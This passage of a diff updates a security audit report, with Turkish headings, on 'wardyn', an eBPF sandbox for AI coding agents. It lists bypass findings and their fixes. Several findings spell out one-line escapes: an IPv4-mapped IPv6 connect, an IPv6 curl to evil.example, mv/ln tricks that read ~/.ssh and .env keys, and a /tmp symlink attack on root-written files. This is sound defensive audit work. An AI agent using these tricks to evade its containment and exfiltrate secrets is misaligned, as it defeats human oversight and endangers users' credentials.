 - **Sorun:** `tui::run` acquires the terminal with `enable_raw_mode()` + `EnterAlternateScreen` and restores it only on the happy path at the end of the function. Six fallible calls between those points use `?`: `term.draw` (x2), `event::poll`, `event::read`, `guard?`, and the post-loop `term.draw`. Any of them returning `Err` (transient EIO on the tty, SIGWINCH-adjacent write failure, a crossterm parse error, an AsyncFd error) unwinds past `disable_raw_mode()`, `LeaveAlternateScreen` and `show_cursor()`. The panic hook installed at line 294 covers panics only, not `Err`. The anyhow error then propagates out of `main`, which prints it — into a terminal still in raw mode with the alternate buffer active, so the message is often invisible. The restore sequence itself is also `?`-chained, so a failing `disable_raw_mode` skips `LeaveAlternateScreen` and `show_cursor`. Additionally, `enable_raw_mode()?` succeeding followed by `execute!(out, EnterAlternateScreen)?` or `Terminal::new(...)?` failing leaves raw mode on with no restore. Finally, `install_panic_hook` restores raw mode and the screen but never calls `show_cursor`, so ratatui's `hide_cursor` (issued by every `draw`) persists after a panic.
 - **Etki:** The user's shell is left unusable (no echo, no line editing, no visible cursor, wrong screen buffer) and the error explaining why is hidden. Requires a blind `reset`/`stty sane`.
@@ -554,6 +678,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### 🟡 ORTA — `wait_for` calls `std::process::exit(1)` on a wait error, skipping terminal restore, the final ring sweep and the exit summary
 *`robustness` · efor: S · id: `wait-for-process-exit`*
+
+> **Durum:** ✅ **Kapatıldı** — wardyn waits for the target and exits with its status.
 
 - **Konum:** `wardyn/src/main.rs:363-368`
 - **Sorun:** `wait_for` handles a failed `Child::wait()` by hard-exiting the process from inside a select branch. `std::process::exit` runs no destructors and no unwinding, so: the terminal stays in raw mode inside the alternate screen (the panic hook does not fire — this is not a panic); the post-loop `drain(async_fd.get_mut(), ...)` never runs, so queued denials are never audited or receipted; the `wardyn: N policy violation(s) logged to ...` / `N denial(s) receipted to ...` summary never prints; and the exit code is a bare 1 with no message at all explaining what happened. The BufWriters happen to survive because `write_line`/`record` flush eagerly, but that is incidental.
@@ -563,6 +689,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### 🟡 ORTA — Paths of 256 bytes or more arrive with `path_len == 0`, so the feed shows a blank DETAIL and the policy is evaluated against the empty string
 *`correctness` · efor: S · id: `long-path-blank-detail`*
 
+> **Durum:** ✅ **Kapatıldı** — reported as `<path over 256 bytes or unreadable — NOT evaluated>` rather than as a blank allowed row.
+
 - **Konum:** `wardyn/src/main.rs:980-983; wardyn-ebpf/src/main.rs:182-186`
 - **Sorun:** The eBPF side writes `path_len = 0` whenever `bpf_probe_read_user_str_bytes` errors, and the kernel's `strncpy_from_user_nofault` returns `-E2BIG` when the string does not fit the destination — i.e. for any path at or beyond `PATH_LEN` (256). Userspace then does `let len = (ev.path_len as usize).min(PATH_LEN); field_str(&ev.path[..len])`, yielding `""`. The empty string is then fed to `policy.eval_file("")` (a trailing `**` allow rule matches it) and `policy.kernel_file_denial("")` (returns `None` because `rsplit('/').filter(non-empty).next()` is `None`), so the row renders as a grey `ok` with an empty DETAIL column. Meanwhile the LSM hook, which keys off the dentry name and not the path length, may well have denied it.
 - **Etki:** Deep paths — `node_modules`, Rust `target/`, Bazel/pnpm trees, long temp dirs — are routine in agent workloads, and every one of them appears as a blank, allowed row. Combined with the dentry mismatch above this is another class of denial that is enforced but invisible to the operator, the audit log and the agent.
@@ -570,6 +698,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### 🟡 ORTA — The audit log is written to the watched process's own working directory and every write failure is discarded
 *`robustness` · efor: M · id: `audit-log-tamperable-and-silent-failures`*
+
+> **Durum:** ✅ **Kapatıldı** — `O_NOFOLLOW`, owner and mode checked on the descriptor, write failures counted, real path reported.
 
 - **Konum:** `wardyn/src/main.rs:196, 751-766; wardyn/src/audit.rs:19-33`
 - **Sorun:** Two compounding issues. (1) The default audit path is the relative `wardyn-audit.jsonl`, resolved against wardyn's cwd — which is also the child's cwd, since `Command` inherits it. The watched process (running as root, see the privilege finding) can therefore truncate, rewrite or unlink the very security record that documents its violations; nothing in the policy protects it and the LSM hook only denies by basename/dir. (2) Every audit and receipt write in the hot path is `let _ =`, so ENOSPC, EIO, or an unwritable log makes wardyn drop records silently and continue. `Audit::count()` only increments on success, so the exit summary prints a smaller number with no hint that anything failed. `Audit::create` also uses `OpenOptions::create(true).append(true)` with no `O_NOFOLLOW` and no explicit mode, so a pre-planted symlink at the audit path turns wardyn into an append-as-root primitive.
@@ -579,6 +709,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### 🟡 ORTA — Root-written receipt at a predictable `/tmp` path, opened with `File::create` (follows symlinks, no O_EXCL) and left world-readable
 *`robustness` · efor: S · id: `receipt-tmp-symlink-and-mode`*
 
+> **Durum:** ✅ **Kapatıldı** — `O_EXCL|O_NOFOLLOW` + 0600.
+
 - **Konum:** `wardyn/src/main.rs:423-431; wardyn/src/receipt.rs:45-52`
 - **Sorun:** The default receipt path is `std::env::temp_dir().join(format!("wardyn-denials-{}.jsonl", std::process::id()))` and it is created with `File::create`, i.e. `O_WRONLY|O_CREAT|O_TRUNC`, mode 0666&~umask (typically 0644), as root, following symlinks. Three problems: (a) the name is fully predictable from a pid, and the pid space is small enough to pre-populate exhaustively — a local user can pre-plant `/tmp/wardyn-denials-<pid>.jsonl` as a symlink to `/etc/ld.so.preload` or a systemd unit and get a root-owned truncate-and-write. `fs.protected_symlinks=1` (the modern default) blocks the classic sticky-dir case, but that sysctl is not guaranteed, and `env::temp_dir()` honours `$TMPDIR`, which sudo configurations sometimes preserve — an attacker-controlled `TMPDIR` moves the write outside the protected-sticky-dir regime entirely. (b) The file is world-readable and contains the full paths of denied opens (`/home/me/.ssh/id_ed25519`, `/home/me/.aws/credentials`) and denied network destinations — a map of the victim's secrets for any local user. (c) `--denials <path>` truncates whatever it is pointed at, as root, with no confirmation.
 - **Etki:** Best case an information leak about which secrets an agent tried to touch; worst case (protected_symlinks off, or a preserved hostile TMPDIR) an arbitrary root-owned file truncation/overwrite triggered by simply running wardyn.
@@ -586,6 +718,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### 🟡 ORTA — All fail-open startup warnings are printed to the primary screen milliseconds before the TUI switches to the alternate screen, and `log::warn!` has no logger at all in TUI mode
 *`dx` · efor: M · id: `startup-warnings-invisible-under-tui`*
+
+> **Durum:** ✅ **Kapatıldı** — notices are handed to the TUI and rendered inside it, not printed before the alternate screen.
 
 - **Konum:** `wardyn/src/main.rs:388-393, 397-416, 465-479, 501-509, 526-535, 548-564; wardyn/src/policy.rs:284`
 - **Sorun:** Every fail-open diagnostic wardyn produces — untested kernel, unenforceable `block` patterns, over-broad kernel keys, missing handshake tracepoint, missing openat2/execveat/sendto tracepoints, unavailable BPF LSM, unreadable fork offsets, pid-namespace mismatch — is an `eprintln!` emitted before `tui::run` calls `EnterAlternateScreen`. In the default (TTY) mode the user sees them for a few milliseconds at most and then stares at a TUI that says nothing about the degraded state. Worse, `env_logger` is only initialised when `!use_tui`, so `log::warn!`/`info!` are no-ops in TUI mode — including `policy.rs:284`, which is the *only* notification that a `domain:` rule failed to resolve and was dropped from the policy. A `{ domain: "exfil.example", action: block }` rule that fails DNS resolution is silently removed with zero user-visible output under the default UI.
@@ -595,6 +729,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### 🟡 ORTA — `tokio::signal::ctrl_c()` is recreated every loop iteration (interrupts in the gap are swallowed) and SIGTERM/SIGHUP are not handled at all
 *`robustness` · efor: S · id: `ctrl-c-future-recreated-and-no-sigterm`*
 
+> **Durum:** ✅ **Kapatıldı** — one long-lived future each for SIGINT, SIGTERM and SIGHUP.
+
 - **Konum:** `wardyn/src/main.rs:660-673; wardyn/src/tui.rs:322-323`
 - **Sorun:** Both event loops call `tokio::signal::ctrl_c()` inside `select!`, so a fresh `Signal` receiver is constructed and dropped on every iteration. Tokio documents that once the handler is installed it stays installed for the process lifetime and the default terminate-on-SIGINT behaviour is *not* restored when the future is dropped; a SIGINT broadcast while no receiver is subscribed is not observed by a receiver created afterwards. Because the plain loop's ring branch is frequently ready, this race is reachable: the interrupt is absorbed by tokio's handler and produces no effect, so Ctrl-C appears to do nothing. There is also no handler for SIGTERM or SIGHUP — `systemd-run`, a terminal close, or a `kill` gives an immediate death with no terminal restore, no final ring drain, no exit summary, and an orphaned unsupervised child.
 - **Etki:** In `--plain`/CI mode Ctrl-C can be a no-op (users have to hit it repeatedly), and because tokio has already disabled the default action there is no fallback. Under a service manager or on terminal hang-up, wardyn dies in its worst state: broken terminal, truncated audit trail, orphaned agent.
@@ -602,6 +738,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### 🟡 ORTA — wardyn always exits 0 regardless of the target's exit status, and the TUI never shows it
 *`correctness` · efor: S · id: `exit-status-not-propagated`*
+
+> **Durum:** ✅ **Kapatıldı** — wardyn exits with the target's status; e2e asserts 7.
 
 - **Konum:** `wardyn/src/main.rs:363-368, 663-666, 616-635; wardyn/src/tui.rs:364`
 - **Sorun:** `wait_for` returns the child's `ExitStatus`, but the plain loop only formats it into an `info!` line and the TUI discards it entirely (`_ = wait_for(&mut child)`). `main` returns `result` — `Ok(())` for any successful run — so `wardyn --enforce run -- pytest` exits 0 whether the tests passed or the process was killed by SIGSEGV. A supervisor that wraps a command and swallows its exit code is unusable in CI or in shell pipelines, and it also hides the case where the target died *because* wardyn denied its exec (`bprm_check` EPERM on the very first exec makes the child fail immediately, and nothing in the TUI says so).
@@ -611,6 +749,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### ⚪ DÜŞÜK — `std::env::args()` panics on non-UTF-8 arguments, so a target command with a non-UTF-8 path argument aborts wardyn before it starts
 *`robustness` · efor: S · id: `argv-non-utf8-panic`*
 
+> **Durum:** ✅ **Kapatıldı** — arguments are `OsString` throughout.
+
 - **Konum:** `wardyn/src/main.rs:191-270, 578-579`
 - **Sorun:** `parse_args` iterates `std::env::args()`, which is documented to panic during iteration if any argument is not valid Unicode. Linux argv is arbitrary bytes, and wardyn's whole purpose is to launch a user-supplied command with user-supplied arguments — file paths on Linux are byte strings and non-UTF-8 names are legal and occur in the wild. The failure is a panic inside `parse_args`, so the user gets a Rust backtrace rather than a diagnostic. The same choice also makes it impossible to pass a non-UTF-8 argument through to the child at all, since `Mode::Run(Vec<String>)` and `Command::new(&argv[0])` are String-typed.
 - **Etki:** `sudo wardyn run -- ls $'\xff'` panics. Any agent invocation whose arguments include a non-UTF-8 path cannot be run under wardyn.
@@ -618,6 +758,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### ⚪ DÜŞÜK — `--audit`/`--policy`/`--denials` silently consume the next token even when it is another flag, so `wardyn --audit --enforce run -- x` runs in observe mode
 *`correctness` · efor: S · id: `flag-value-swallowing`*
+
+> **Durum:** ✅ **Kapatıldı** — `value()` refuses a flag-shaped value and says so.
 
 - **Konum:** `wardyn/src/main.rs:217-228`
 - **Sorun:** Each value-taking option does an unconditional `it.next()` with no check that the token is not itself an option. `wardyn --audit --enforce run -- cmd` (a plausible typo — forgetting the audit path) parses as `audit_path = "--enforce"`, leaves `enforce = false`, creates a file literally named `--enforce` in the cwd, and runs the whole session in observe mode while the user believes enforcement is on. `--policy --enforce` at least fails, but with the confusing message `reading policy --enforce: No such file or directory`. Related smaller edges in the same function: `watch` is accepted as an undocumented alias for `--all` (main.rs:235) but is absent from `print_usage`; `--help`/`-h` are only recognised before the mode, so `wardyn --all --help` errors out; and only a single leading `--` is stripped after `run`.
@@ -627,6 +769,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### ⚪ DÜŞÜK — `run_plain` prints with `println!` inside the drain loop: a closed pipe panics, a slow pipe blocks the runtime
 *`robustness` · efor: S · id: `plain-mode-println-blocking-and-sigpipe`*
 
+> **Durum:** ✅ **Kapatıldı** — the plain and JSON writers tolerate a closed pipe.
+
 - **Konum:** `wardyn/src/main.rs:644-679, 738-771`
 - **Sorun:** The plain sink writes each row with `println!`, executed inside `drain`'s `while let Some(item) = ring.next()` body while a `RingBufItem` is still borrowed (the consumer position only advances when the item drops). Rust ignores SIGPIPE, so `wardyn --plain --all | head -20` makes `println!` panic with `failed printing to stdout: Broken pipe`, unwinding out of `drain` and `main` with the child orphaned and no summary. A merely *slow* reader blocks the single-threaded runtime inside the drain, delaying ring consumption and feeding the silent-overflow problem. `Stdout` is a `LineWriter`, so this is one write syscall per event even when piped to a file.
 - **Etki:** Piping wardyn into `head`/`grep -m1` — the obvious way to use `--plain` — crashes it. Piping into a slow consumer degrades event capture.
@@ -634,6 +778,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### ⚪ DÜŞÜK — A failed exception grant is rendered as a policy `warn`, inflating the warn counter with an internal error
 *`dx` · efor: S · id: `exception-failure-counted-as-warn`*
+
+> **Durum:** ✅ **Kapatıldı** — a failed apply is a notice row, explicitly kept out of the warn counter.
 
 - **Konum:** `wardyn/src/tui.rs:247-291`
 - **Sorun:** When `KernelMaps::apply_exception` fails, `exception_row` builds a `Desc` with `action: Action::Warn`, which `App::push` then counts in `self.warn` alongside genuine policy warnings. The row's `label` is `"except"` and its detail begins `FAILED to apply exception:`, so it is visually distinguishable, but the header counter now conflates a wardyn-internal map error with agent behaviour. It is also not recorded anywhere durable — no audit entry, no receipt entry — even though a *successful* grant is recorded in both.
@@ -643,6 +789,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### ⚪ DÜŞÜK — The pid-ns handshake sets a fully random 32-bit personality on the calling thread
 *`robustness` · efor: S · id: `personality-arbitrary-persona`*
 
+> **Durum:** 🔓 **Açık** — duplicate of `personality-handshake-side-effects`; the nonce is still unmasked.
+
 - **Konum:** `wardyn/src/main.rs:949-972`
 - **Sorun:** `learn_init_ns_tgid` reads 4 random bytes and passes them straight to `personality()`. The persona word is not opaque: its low byte selects a personality *type* (PER_LINUX32, PER_SVR4, PER_BSD, ...) and the high bits are behaviour flags (ADDR_NO_RANDOMIZE, READ_IMPLIES_EXEC, MMAP_PAGE_ZERO, ADDR_LIMIT_3GB, ADDR_COMPAT_LAYOUT). The code guards only the two sentinel values 0 and `u32::MAX`. The window is one syscall wide and the persona is restored immediately, and `personality` is per-task so no other thread is affected — but relying on 'nothing happens in between' for a randomly-chosen ABI-altering process attribute is fragile, and the restore is skipped entirely if the set call returns -1 for any reason other than the persona genuinely having been -1.
 - **Etki:** Low in practice, but a random persona is a needless ABI hazard in a root process, and any future code (or a signal handler / async-signal delivery) executing in that window inherits it.
@@ -650,6 +798,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### 🔵 BİLGİ — IPv4 LPM-trie keys are built with `from_le_bytes`, which is only correct on little-endian hosts
 *`portability` · efor: S · id: `be-portability-lpm-key`*
+
+> **Durum:** ✅ **Kapatıldı** — see `v4-lpm-key-endianness`.
 
 - **Konum:** `wardyn/src/main.rs:142-149; wardyn/src/policy.rs:355-371`
 - **Sorun:** The kernel LPM trie matches on the raw byte layout of the key, so the `u32` handed to `Key::new` must have the address octets in memory order. `u32::from_le_bytes(octets)` produces that only on a little-endian host; on big-endian Linux (s390x, some ppc64) the bytes are reversed and every CIDR rule matches the wrong prefix. The eBPF side reads `(*ctx.sock_addr).user_ip4` (already network order) and compares against these keys, so the mismatch would be silent — rules would simply fail to fire or fire on unrelated addresses.
@@ -676,6 +826,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### 🔴 KRİTİK — IPv4-mapped IPv6 addresses (::ffff:a.b.c.d) bypass every `0.0.0.0/0 block` rule
 *`bypass` · efor: S · id: `v4-mapped-egress-bypass`*
 
+> **Durum:** ✅ **Kapatıldı** — `connect6` detects the `::ffff:0:0/96` prefix and runs the v4 matcher.
+
 - **Konum:** `wardyn-ebpf/src/main.rs:296-326 (try_connect6); wardyn/src/policy.rs:500-506 (eval_connect6), 375-388 (net_entries6)`
 - **Sorun:** `try_connect6` looks the 16-byte destination up in `NET_RULES6` only, and falls back to `cfg(CFG_NET_DEFAULT)` on a miss. A connect to `::ffff:1.2.3.4` on an AF_INET6 socket runs `tcp_v6_pre_connect` → `BPF_CGROUP_RUN_PROG_INET6_CONNECT` with `user_ip6 = ::ffff:1.2.3.4` — the INET4 hook never runs, so none of the IPv4 rules (including the `0.0.0.0/0 block` that every preset relies on for "deny all other egress") are consulted. `NET_RULES6` is empty in all three shipped presets, so the default (`allow`) applies and the connection is permitted. Userspace `eval_connect6` has the identical blind spot, so the feed reports `ok` too — the bypass is silent, not just unenforced. This is not exotic: Linux JVMs, and any program using a dual-stack AF_INET6 socket or `getaddrinfo` with `AI_V4MAPPED`, reach IPv4 hosts this way by default; a hostile agent needs one line of Python (`socket.socket(AF_INET6).connect(('::ffff:1.2.3.4', 443))`).
 - **Etki:** An agent under `--enforce` with the strict preset exfiltrates to any IPv4 address on the internet, and the wardyn feed shows the connection as `ok` (grey). The single headline enforcement claim of the README ("deny all other egress") is defeated by choosing a socket family.
@@ -683,6 +835,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### 🟠 YÜKSEK — No preset has an IPv6 catch-all, so `deny all other egress` only covers IPv4
 *`correctness` · efor: S · id: `no-v6-default-in-presets`*
+
+> **Durum:** ✅ **Kapatıldı** — see `ipv6-egress-hole`.
 
 - **Konum:** `policy.yaml:24-32; policies/strict.yaml:22-30; policies/permissive.yaml:17-22`
 - **Sorun:** Every preset ends its `network` list with `{ cidr: "0.0.0.0/0", action: block }` and nothing else. `default_action: allow` becomes `CFG_NET_DEFAULT`, so any IPv6 destination that misses `NET_RULES6` (i.e. all of them) is allowed. The engine's own test suite documents this as intended behaviour (`// unmatched v6 -> default (allow in P); the v4 0.0.0.0/0 rule does not apply`), but the presets never act on it, and nothing at startup notices that a policy has a v4 catch-all block and no v6 counterpart. On any dual-stack host, `getaddrinfo` returns AAAA first and `curl https://evil.example` goes out over IPv6, unblocked.
@@ -692,6 +846,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### 🟠 YÜKSEK — The kernel matcher is an unordered union of block keys — rule order and allow/warn rules do not exist under `--enforce`
 *`correctness` · efor: M · id: `kernel-ignores-rule-order`*
 
+> **Durum:** ✅ **Kapatıldı** — `NetRule.order` survives the domain split, and the LPM tiers are consulted most-specific first.
+
 - **Konum:** `wardyn/src/policy.rs:306-325 (kern_names/kern_dirs/kern_execs), 538-554 (eval_path); wardyn/src/main.rs:896-905 (reconcile)`
 - **Sorun:** Userspace evaluates files/exec as an ordered first-match list. The kernel maps are built by iterating *only* the `block` rules and inserting their reduced segment; earlier `allow` or `warn` rules are never consulted and rule order is discarded entirely. So a rule cannot be shadowed, narrowed, or excepted by policy — only by the operator pressing `a` in the TUI. `reconcile` then dutifully rewrites the userspace verdict to `kernel:<key>`, so the feed stays honest while the *policy language* silently loses its most basic composition primitive. Writing `- { match: "**/fixtures/.env", action: allow }` ahead of `- { match: "**/.env", action: block }` produces a policy that reads as an exception and behaves as a hard block.
 - **Etki:** Operators cannot express any exception, cannot demote a rule to `warn` for a specific path, and cannot reason about their policy from the documented semantics. In strict.yaml this is already load-bearing: an explicit `warn` rule is overridden into a hard `BLOCK` by an unrelated rule's derived key (see `preset-config-key-blocks-git`).
@@ -699,6 +855,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### 🟠 YÜKSEK — strict.yaml compiles to "deny any file named `config`" and "any file named `config.json`" — it breaks git and contradicts its own `warn` rule
 *`correctness` · efor: S · id: `preset-config-key-blocks-git`*
+
+> **Durum:** ✅ **Kapatıldı** — the rule names `**/.config/gcloud/**`, not `.config`.
 
 - **Konum:** `policies/strict.yaml:13-14 and :19; wardyn/src/policy.rs:564-570 (file_seg)`
 - **Sorun:** `file_seg` reduces a non-`/**` pattern to its last literal segment, so `**/.kube/config` → BLOCK_NAMES[`config`] and `**/.docker/config.json` → BLOCK_NAMES[`config.json`]. The LSM hook matches basenames with no directory context, so under `--enforce` with the recommended "strict" preset every open of a file named `config` is EPERM — including `.git/config`, which git reads on literally every command. The same file explicitly declares `- { match: "**/.git/config", action: warn }` three lines later; that rule is unreachable, and `reconcile` converts it into `kernel:name=config` BLOCK. `config.json` is likewise ubiquitous in JS/TS trees.
@@ -708,6 +866,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### 🟠 YÜKSEK — When BPF LSM fails to attach, the feed still prints `BLOCK` and the receipt tells the agent it was denied
 *`correctness` · efor: M · id: `lsm-unavailable-still-claims-denials`*
 
+> **Durum:** ✅ **Kapatıldı** — see `lsm-attach-failure-still-claims-BLOCK`.
+
 - **Konum:** `wardyn/src/main.rs:501-509 (attach_lsm non-fatal), 728-731 (Desc::denied), 738-767 (drain); wardyn/src/policy.rs:159-165 (PathRule::enforceable)`
 - **Sorun:** `enforceable` models whether a *rule shape* reduces to a kernel key — not whether the enforcement backend actually attached. `attach_lsm` failure is deliberately non-fatal (correct), but `opts.enforce` stays `true`, so `Desc::denied(enforce)` returns true for every enforceable file/exec block, `act()` renders `BLOCK`, the audit record carries `denied: true`, and `Receipt::record` writes a line whose header instructs the agent "Do not retry or work around a denial". Meanwhile the agent read the `.env` successfully. Per ARCHITECTURE.md's own platform matrix, this is the *default* situation on stock WSL2 (file/exec block ❌). The same inversion occurs under kernel-offset drift, where `read_name` reads garbage and no denial happens.
 - **Etki:** The tool's central invariant ("the feed never disagrees with the syscall's real outcome") is inverted in the most common degraded configuration: wardyn claims to have blocked secret reads it did not block, and actively instructs the agent not to retry an operation that in fact succeeded. An operator watching a green-looking run believes their secrets were protected.
@@ -715,6 +875,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### 🟠 YÜKSEK — `**/dir/**` rules only cover the directory's immediate children — silently, and the startup warning claims otherwise
 *`correctness` · efor: L · id: `dir-rules-one-level-only`*
+
+> **Durum:** ✅ **Kapatıldı** — the LSM walks up to `MAX_DIR_WALK` ancestors.
 
 - **Konum:** `wardyn-ebpf/src/main.rs:380-386 (single d_parent read); wardyn/src/policy.rs:408-419 (kernel_file_denial), 441-452 (overbroad_block_keys wording)`
 - **Sorun:** The LSM hook reads exactly one parent (`dentry->d_parent->d_name`), so `**/.ssh/**` denies `~/.ssh/id_rsa` but not `~/.ssh/keys/id_rsa`, and the default policy's `**/.config/gcloud/**` denies `~/.config/gcloud/credentials.db` but not `~/.config/gcloud/legacy_credentials/<account>/adc.json` — which is where gcloud actually stores refresh tokens. A canonical `**/dir/**` rule is not in `observe_only_blocks()` (it *is* enforceable) and not in `overbroad_block_keys()` (it *is* the canonical form), so the one-level limitation is announced nowhere at startup. Worse, when a dir rule *is* flagged as overbroad, the message says "any file **under** a dir named `{seg}`" — overstating the reach in exactly the direction that creates false confidence, while `DenialKey::blast_radius()` correctly says "directly inside".
@@ -724,6 +886,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### 🟠 YÜKSEK — Relative-path opens defeat the userspace mirror: a real kernel denial is displayed as `ok` and never receipted
 *`correctness` · efor: L · id: `relative-path-mirror-blind`*
 
+> **Durum:** ✅ **Kapatıldı** — an unresolvable path is reported as not evaluated instead of as allowed.
+
 - **Konum:** `wardyn/src/policy.rs:408-419 (kernel_file_denial); wardyn-ebpf/src/main.rs:160-190 (emit_path_event reads the raw user string)`
 - **Sorun:** The observation path copies the *syscall argument* — often a relative path — while the LSM hook resolves the real dentry. For a bare filename, `kernel_file_denial` extracts the basename and then `segs.next()?` returns `None`, so it gives up before the dir check. `cd ~/.ssh && cat id_ed25519` is therefore denied by the kernel (parent dentry is `.ssh`) but the mirror returns `None`, `reconcile` takes the `None` branch, the glob doesn't match either, and the row renders `ok` in grey. Nothing is audited and nothing is receipted, so the agent gets a bare EPERM with an empty `WARDYN_DENIALS` — precisely the failure mode the receipt exists to eliminate. The same applies to paths longer than `PATH_LEN` (256), which are truncated from the front so the basename is lost.
 - **Etki:** Under `--enforce`, an entire class of denials — everything an agent does after `cd` into a protected directory, which is the normal way a shell agent works — is invisible in the feed, absent from the audit log, and absent from the receipt. The feed is not merely coarse here; it is wrong in the unsafe direction (claims allow for a denial).
@@ -731,6 +895,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### 🟠 YÜKSEK — Domain rules are resolved once, at load, in the wrong process — wrong in both directions for a CDN-shaped internet
 *`correctness` · efor: XL · id: `domain-resolved-once`*
+
+> **Durum:** ✅ **Kapatıldı** — 60s refresh.
 
 - **Konum:** `wardyn/src/policy.rs:281-297 (expansion), 594-599 (resolve_domain)`
 - **Sorun:** `resolve_domain` calls `to_socket_addrs` once at policy compile time and freezes each answer into a /32 (or /128) rule. Three separate problems follow. (1) Staleness: `api.anthropic.com`, `github.com` and `registry.npmjs.org` sit behind anycast/CDN address sets with short TTLs and rotating members; the agent's own later lookup routinely returns an address wardyn never saw, and the connect is denied by the `0.0.0.0/0` rule with the operator's allow rule apparently in force. (2) Over-allowance: allowing an IP allows *every* site served by that edge — a Cloudflare or Fastly anycast address serves millions of domains, so `{ domain: github.com, action: allow }` is in practice "allow exfiltration to any attacker domain hosted on the same CDN". (3) Domain *blocks* are unenforceable for the same reason, and are silently overridden: an earlier `allow` domain sharing an IP wins the reversed-insert tie-break. The doc comment also misdescribes the behaviour — it says A-record/IPv4, while `to_socket_addrs` returns AAAA too. Resolution failure is `log::warn!`, which is invisible in the default TUI path because env_logger is only initialised when `!use_tui`.
@@ -740,6 +906,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### 🟠 YÜKSEK — The model has no read/write/create/unlink axis, and rename/link defeat name-based file blocks
 *`feature` · efor: XL · id: `no-access-mode-axis`*
 
+> **Durum:** ✅ **Kapatıldı** — `access: read | write | create | delete | all`, with the honesty notice when the offsets to read it did not resolve.
+
 - **Konum:** `wardyn-ebpf/src/main.rs:352-389 (file_open, f_mode unused); wardyn/src/policy.rs:143-148 (PathRuleRaw has only match+action)`
 - **Sorun:** The only file hook is `file_open`, and `struct file`'s `f_mode`/`f_flags` are never read, so `- { match: "**/.env", action: block }` blocks reading, writing, creating and truncating identically — you cannot express "the agent may write its own `.env` but not read mine", nor "read-only access to /workspace". More seriously, identity is the *name*, not the inode, and the operations that change a name are neither hooked nor observed: `mv ~/.ssh/id_rsa /tmp/k && cat /tmp/k` and `ln ~/.env /tmp/x && cat /tmp/x` both bypass an enforceable block completely (neither `rename(2)` nor `link(2)` opens the file, and the new dentry's basename is not a block key). Deletion is equally unconstrained and invisible: `rm -rf ~/project` produces no events at all. SECURITY.md lists observe-only rules and fail-open as out of scope but says nothing about rename/link; by its own in-scope definition ("read a file ... that policy marks block, while --enforce is active and the rule is kernel-enforceable") this is an in-scope bypass.
 - **Etki:** Two-line shell bypass of the flagship secret-file protection, and zero coverage of the destructive-agent scenario (mass delete/overwrite) that operators most fear from an autonomous coding agent.
@@ -747,6 +915,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### 🟡 ORTA — `**/.aws`-style rules silently protect nothing and pass both startup honesty checks
 *`correctness` · efor: S · id: `silent-noop-dir-rule`*
+
+> **Durum:** ✅ **Kapatıldı** — `observe_only_blocks` reports every rule the kernel cannot enforce.
 
 - **Konum:** `wardyn/src/policy.rs:564-570 (file_seg), 435-466 (overbroad_block_keys), 470-477 (observe_only_blocks)`
 - **Sorun:** A pattern without the `/**` suffix reduces to a *basename* key. `- { match: "**/.aws", action: block }` therefore inserts `.aws` into BLOCK_NAMES, which denies opening the directory inode named `.aws` and nothing else — `~/.aws/credentials` opens fine. The rule is `enforceable`, so it is not in `observe_only_blocks()`; it equals its own canonical form `**/{seg}`, so it is not in `overbroad_block_keys()`. The operator gets no warning of any kind. A trailing slash (`**/.ssh/`) behaves identically, because `last_segment` skips empty segments. This is the single most plausible way for a user to write a directory rule.
@@ -756,6 +926,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 ### 🟡 ORTA — `default_action` means "hard deny-all" for network and "do nothing" for files/exec, with no startup warning
 *`correctness` · efor: M · id: `default-action-asymmetry`*
 
+> **Durum:** ⏸️ **Bilerek açık** — deliberate; see `default-deny-asymmetry-files-vs-network`.
+
 - **Konum:** `wardyn/src/main.rs:512-516 (CFG_NET_DEFAULT), 397-416 (startup warnings); wardyn/src/policy.rs:538-554 (eval_path default verdict)`
 - **Sorun:** One knob drives three axes with opposite effects. `config.set(2, policy.default_action_code(), 0)` makes `default_action: block` an in-kernel deny-all for egress (including loopback and DNS if no allow rules precede it), while for files/exec the default verdict is constructed with `enforceable: false` and contributes no kernel key, so it enforces nothing. `observe_only_blocks()` iterates only the *rules* — never the default — so under `--enforce` a `default_action: block` policy produces no warning at all about files/exec. SECURITY.md acknowledges the files/exec half ("default-deny on files/exec ... not kernel-enforced"), but the network half's opposite behaviour is documented nowhere, and nothing is surfaced at runtime.
 - **Etki:** An operator writing `default_action: block` believes they have default-deny everywhere. They get a fully bricked network (agent cannot even resolve DNS) plus zero file protection — the exact inverse of a sane failure mode — and are told neither thing at startup.
@@ -763,6 +935,8 @@ paketleme/release altyapısı. Bunlar README'nin Roadmap'ında ve
 
 ### 🟡 ORTA — Exec policy matches basenames only — defeated by `cp`, and argv is never captured
 *`bypass` · efor: L · id: `exec-basename-only`*
+
+> **Durum:** ✅ **Kapatıldı** — `path:` rules pin an exec by `(dev, ino)`.
 
